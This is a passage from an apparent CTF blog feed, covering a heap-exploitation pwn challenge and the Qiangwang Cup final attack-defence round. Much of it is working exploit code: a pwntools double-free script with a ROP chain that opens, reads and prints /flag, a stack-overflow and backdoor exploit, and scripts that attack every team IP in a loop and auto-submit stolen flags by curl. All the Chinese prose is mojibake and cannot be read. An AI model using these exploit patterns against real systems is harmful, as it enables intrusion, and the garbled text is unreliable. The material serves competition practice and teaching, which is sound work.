class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">show(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">enc = p.recvuntil(<span class="string">&quot;wellcome&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p1 = process(<span class="string">&quot;./dec&quot;</span>)</span><br><span class="line">p1.send(enc)</span><br><span class="line">dec = p1.recv(<span class="number">0x10</span>)</span><br><span class="line">libc.address = u64(dec[:<span class="number">8</span>]) - <span class="number">0x5f1a88</span></span><br><span class="line">stack = u64(dec[<span class="number">8</span>:])</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAAAAA\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAAAAA\n&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">add(<span class="number">0x68</span>,p64(stack-<span class="number">0xf3</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAA\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi = <span class="number">0x000000000019dc65</span> + libc.address</span><br><span class="line">p_rsi = <span class="number">0x000000000013cd4f</span> + libc.address</span><br><span class="line">p_rdx = <span class="number">0x0000000000115166</span> + libc.address</span><br><span class="line">p_rax = <span class="number">0x000000000003a738</span> + libc.address</span><br><span class="line">syscall_ret = <span class="number">0x00000000000bc3f5</span> + libc.address</span><br><span class="line">rop_chain = [</span><br><span class="line">p_rdx,<span class="number">0x200</span>,p_rax,<span class="number">0</span>,</span><br><span class="line">syscall_ret</span><br><span class="line">]</span><br><span class="line">payload=p64(p_rdx)+p64(<span class="number">0x200</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># payload = flat(rop_chain)</span></span><br><span class="line"><span class="comment"># debug(0x000000000000E62)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAA\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x2b</span>+payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=p64(p_rdi)+p64(stack-<span class="number">0xb4</span>+<span class="number">0x1c</span>)+p64(p_rsi)+p64(<span class="number">0</span>)+p64(p_rdx)+p64(<span class="number">0</span>)+p64(p_rax)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line">payload+=p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rsi)+p64(stack+<span class="number">0x300</span>)+p64(p_rdx)+p64(<span class="number">0x30</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload+=p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rsi)+p64(stack+<span class="number">0x300</span>)+p64(p_rdx)+p64(<span class="number">0x30</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x4b</span>)+<span class="string">&#x27;/flag\x00\x00\x00&#x27;</span>+payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯_final</title>
      <link href="/2020/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF_final%E6%88%98%E8%AE%B0/"/>
      <url>/2020/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF_final%E6%88%98%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼ºç½‘æ¯-final"><a href="#å¼ºç½‘æ¯-final" class="headerlink" title="å¼ºç½‘æ¯_final"></a>å¼ºç½‘æ¯_final</h2><blockquote><p>æ²¡æƒ³åˆ°ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹å°±å›åˆ°äº†å®¶ä¹¡æ²³å—ï¼Œå¼ºç½‘æœ‰æ’é¢ï¼ï¼<br> çº¿ä¸‹èµ›èµ›åˆ¶ä¸ºAD(awd)å’ŒRW(real world)ï¼Œreal worldå°±ç›¸å½“ä¸æŒ–æ˜0dayï¼Œéš¾åº¦ä¸è¨€è€Œå–»ï¼ŒADçš„è¯åªæœ‰pwné¢˜ï¼Œå 50%çš„åˆ†æ•°ï¼Œå› æ­¤pwné‡‡ç”¨çš„æ˜¯åªæ‰“adçš„ç­–ç•¥ï¼Œæœ€åä¹Ÿå–å¾—äº†ä¸é”™çš„æ•ˆæœã€‚</p></blockquote><span id="more"></span><h3 id="ADçš„èµ›å‰å‡†å¤‡"><a href="#ADçš„èµ›å‰å‡†å¤‡" class="headerlink" title="ADçš„èµ›å‰å‡†å¤‡"></a>ADçš„èµ›å‰å‡†å¤‡</h3><p>æ‰“ADè¦æƒ³è·å¾—ä¸é”™çš„æˆç»©ï¼Œæˆ‘è®¤ä¸ºæœ€é‡è¦çš„å°±æ˜¯è¦æŠ¢å å…ˆæœºã€‚ç‡å…ˆå‘ç°æ¼æ´ï¼Œå¹¶å†™å‡ºexpï¼Œå¾€å¾€èƒ½æ‰“å¾—åˆ«äººæªæ‰‹ä¸åŠï¼Œå› æ­¤èµ›å‰çš„è„šæœ¬å‡†å¤‡å¾€å¾€éå¸¸é‡è¦ã€‚</p><p>å‡†å¤‡è„šæœ¬ä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼š1.æ‰¹é‡IPç”Ÿæˆè„šæœ¬ã€‚2.æ‰¹é‡äº¤flagçš„è„šæœ¬ã€‚<br>æ‰¹é‡IPç”Ÿæˆè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">range_ = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,range_):</span><br><span class="line">t = ip.replace(<span class="string">&quot;x&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">f.write(t+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;usage: python %s ip range&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">usage:</span><br><span class="line">python ip.py <span class="number">172.168</span> <span class="number">.1</span> <span class="number">.1</span> :x <span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰¹é‡äº¤flagè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn&quot;,checksec=False)</span></span><br><span class="line">ips = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).readlines()]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">flag = main(ip)</span><br><span class="line"><span class="comment"># flag = main(args[&quot;REMOTE&quot;])</span></span><br><span class="line">info(flag)</span><br><span class="line">url = <span class="string">&#x27;https://172.20.1.1/Answerapi/sub_answer_api&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;token9013e05455d&#x27;</span></span><br><span class="line">cmds = <span class="string">&#x27;curl -k &#123;&#125; -d &quot;answer=&#123;&#125;&amp;playertoken=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(url,flag.strip(),token)</span><br><span class="line"><span class="built_in">print</span> cmds</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cmds:</span><br><span class="line">os.system(cmds)</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">é€‚ç”¨äºæœ‰curlæ¥å£çš„ADï¼Œè‹¥æ²¡æ­¤æ¥å£ï¼Œåˆ™å…ˆæŠ“åŒ…ï¼Œå†™å‡ºsub_flagå‡½æ•°æ‰¹é‡æäº¤ã€‚</span><br></pre></td></tr></table></figure><h3 id="ADå…¨ç¨‹é«˜èƒ½"><a href="#ADå…¨ç¨‹é«˜èƒ½" class="headerlink" title="ADå…¨ç¨‹é«˜èƒ½"></a>ADå…¨ç¨‹é«˜èƒ½</h3><p>Pwné¢˜ä¸€å…±å‡ºäº†4é“ã€‚</p><p>win(ä¸€é“windowsä¸‹çš„æ ˆæº¢å‡º)</p><p>pd0(goå†™çš„ä¸€ä¸ªæ¡†æ¶)</p><p>sort(vm_pwn)</p><p>thrd(çº¿ç¨‹å †é¢˜)</p><p>ä¸ªäººè®¤ä¸ºæœ€éš¾çš„æ˜¯pd0ï¼Œå¥½åƒåªæœ‰0x300Rç¬¬äºŒå¤©åšå‡ºæ¥äº†ï¼Œç–¯ç‹‚æ‰“ç¾¤åœºã€‚ä¸è¿‡æˆ‘ä»¬å®ˆä½äº†ï¼Œruanå¸ˆå‚…åœ¨githubä¸Šæ‰¾åˆ°äº†æºç ï¼Œæ‰“patchæ”¹äº†max_sizeï¼Œnb!</p><p>ä¸‹é¢ä¾æ¬¡åˆ†æï¼š</p><h4 id="0x01-win"><a href="#0x01-win" class="headerlink" title="0x01 win"></a>0x01 win</h4><p>winæ˜¯ç¬¬ä¸€ä¸ªæ”¾å‡ºçš„é¢˜ç›®ï¼Œä»…è¿‡4åˆ†é’Ÿvidar-timeå°±å‘èµ·è¿›æ”»ï¼Œæˆ‘ä»¬ä¹Ÿç¬é—´ååº”è¿‡æ¥è¿™é“é¢˜ç›®æœ‰åé—¨æœç„¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v43, <span class="string">&quot;vvqqccqaFEFH&quot;</span>, v45) &amp;&amp; v44 == <span class="number">12</span> ) æˆ‘patchè¿‡äº†å·²ç»</span><br><span class="line">      &#123;</span><br><span class="line">        v46 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v46 )</span><br><span class="line">        &#123;</span><br><span class="line">          v47 = sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Can&#x27;t open the flag file&quot;</span>);</span><br><span class="line">          <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;(v47, sub_1400062B0);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( !feof(v46) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( fgets(&amp;Buf, <span class="number">128</span>, v46) )</span><br><span class="line">          &#123;</span><br><span class="line">            v48 = sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)&amp;Buf);  <span class="comment">//cout&lt;&lt;flagï¼ï¼</span></span><br><span class="line">            <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;(v48, sub_1400062B0);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(v46);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ³¢è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">16957</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./pwn_bak.bak.bak&quot;</span>)</span><br><span class="line"><span class="comment"># debug(0x000000000000107B)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;[*] Rounds 1 $&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Banner hide&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;wwssadadBABA&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;wwssadadBABA ]\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># p.sendline(&quot;cat flag&quot;)</span></span><br><span class="line"><span class="comment"># p.recv(timeout=0.5)</span></span><br><span class="line">flag = p.recvuntil(<span class="string">&quot;\r\n&quot;</span>,drop=<span class="literal">True</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">info(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad_luck&quot;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‰“åˆ°ç¬¬å…­ï¼Œä½†å…¶ä»–é˜Ÿä¹Ÿä¸æ˜¯åƒç´ çš„ï¼Œpatchæ”¹â€wwssadadBABAâ€ä¸ºå…¶ä»–å­—ç¬¦ä¸²ã€‚</p><p>ä¹‹ååˆæœ‰ä¸€ä¸ªæ´åœ¨è¿™é‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sub_1400060E0(v5, (__int64)<span class="string">&quot;Please input the password: &quot;</span>);</span><br><span class="line">  sub_140007060(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;password);</span><br><span class="line">  v6 = &amp;password;</span><br><span class="line">  v7 = (<span class="type">char</span> *)password;</span><br><span class="line">  v8 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( v31 &gt;= <span class="number">16</span> )</span><br><span class="line">    v6 = password;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;Dst, v6, Size);  sizeä¸ºå®é™…çš„passwordé•¿åº¦</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;Dst, <span class="string">&quot;I_Love_QWB&quot;</span>, <span class="number">0xA</span>ui64) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Your password &quot;</span>);</span><br><span class="line">    v10 = sub_1400060E0(v9, (__int64)&amp;Dst);</span><br><span class="line">    v11 = sub_1400060E0(v10, (__int64)<span class="string">&quot; seems not true!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::basic_ostream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;::operator&lt;&lt;(v11, sub_1400062B0);</span><br><span class="line">    sub_1400060E0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Try again: &quot;</span>);</span><br><span class="line">    sub_140007060(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;password);</span><br><span class="line">    v12 = &amp;password;</span><br><span class="line">    v7 = (<span class="type">char</span> *)password;</span><br><span class="line">    v8 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v12 = password;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;Dst, v12, Size);</span><br></pre></td></tr></table></figure><p>å¯è§ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥è¾ƒé•¿çš„passwordå¯ä»¥æ³„éœ²å‡ºstackä¸Šçš„åœ°å€ï¼Œç„¶åå†å€ŸåŠ©ç¬¬äºŒæ¬¡çš„try againè¦†ç›–è¿”å›åœ°å€ä¸ºä¸Šé¢åé—¨å‡½æ•°çš„åœ°å€å³å¯!</p><p>patché™åˆ¶sizeä¸º0x30ï¼Œæ ˆæº¢å‡ºä¸äº†ã€‚</p><h4 id="0x02-pd0"><a href="#0x02-pd0" class="headerlink" title="0x02 pd0"></a>0x02 pd0</h4><p>æºç åœ°å€ï¼š<a href="https://github.com/HITB-CyberWeek/proctf-2019/blob/master/services/handy/server/main.go">https://github.com/HITB-CyberWeek/proctf-2019/blob/master/services/handy/server/main.go</a></p><p>Fixingï¼š<br>Either the padding should be removed or a handler should be modified to not leak the information, e.g. by changing the max allowed size of the generated picture.</p><h4 id="0x03-sort"><a href="#0x03-sort" class="headerlink" title="0x03 sort"></a>0x03 sort</h4><p>æ„Ÿè§‰æ˜¯æœ€æœ‰æ„æ€çš„ä¸€é¢˜ã€‚<br>é¢˜ç›®æ„æ€æ˜¯è¦å®Œæˆå¯¹ä¸€ä¸ªéšæœºæ•°ç»„è¿›è¡Œæ’åºï¼Œæ‰€æ‰§è¡Œçš„æ±‡ç¼–æŒ‡ä»¤è¶Šå°‘åˆ†æ•°è¶Šé«˜ï¼Œåˆ†é«˜çš„ä¸€æ–¹è·èƒœï¼Œæ”»å‡»æ–¹è·èƒœæ‹¿flagï¼Œé˜²å®ˆæ–¹è·èƒœåˆ™æ”»å‡»æ–¹æ— æ³•æ‹¿flag.<br>åŒæ—¶æœ‰ç»™å‡ºäº†å‡ºé¢˜äººè‡ªå·±å†™çš„æ±‡ç¼–æŒ‡ä»¤ç³»ç»Ÿï¼Œè¿˜è¦opcodeå’Œåˆèµ›çš„qwloginä¸€æ ·ï¼Œçœå»äº†é€†opcodeçš„æ—¶é—´ã€‚</p><p>opcode:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HLT 0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV 0x01</span></span><br><span class="line"><span class="comment">//CALC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUB 0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MUL 0X04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV 0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 0X06</span></span><br><span class="line"><span class="comment">//BIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XOR 0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OR  0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AND 0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHL 0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHR 0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NOT 0x0c</span></span><br><span class="line"><span class="comment">//STACK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP  0x0d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH 0x0e</span></span><br><span class="line"><span class="comment">//FUNC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET  0x11</span></span><br><span class="line"><span class="comment">//JMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMP 0x12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JMP 0x13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JE  0x14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNE 0x15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JG  0x16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNG 0x17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JL  0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNL 0x19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JA  0x1a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNA 0x1b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JB  0x1c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JNB 0x1d</span></span><br><span class="line"><span class="comment">//INT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ADDR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RR  0X00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RL  0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LR  0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RS  0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SR  0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RI  0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R_  0X06</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I_  0x07</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L_  0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S_  0x09</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __  0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR  0x0b <span class="comment">//RegLoad Reg</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RP  0x0c <span class="comment">//Reg RegLoad</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QR  0x0d <span class="comment">//RegStack Reg</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RQ  0x0e <span class="comment">//Reg RegStack</span></span></span><br><span 